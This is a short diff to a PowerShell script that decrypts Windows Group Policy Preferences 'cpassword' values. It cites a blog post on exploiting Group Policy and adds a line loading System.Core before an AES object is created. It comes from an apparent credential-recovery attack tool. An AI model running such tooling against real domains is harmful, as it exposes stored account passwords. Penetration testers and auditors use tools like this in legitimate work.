@@ -118,6 +118,9 @@ http://rewtdance.blogspot.com/2012/06/exploiting-windows-2008-group-policy.html
             }
 
             $Base64Decoded = [Convert]::FromBase64String($Cpassword)
+            
+            # Make sure System.Core is loaded
+            [System.Reflection.Assembly]::LoadWithPartialName("System.Core") |Out-Null
 
             #Create a new AES .NET Crypto Object
             $AesObject = New-Object System.Security.Cryptography.AesCryptoServiceProvider
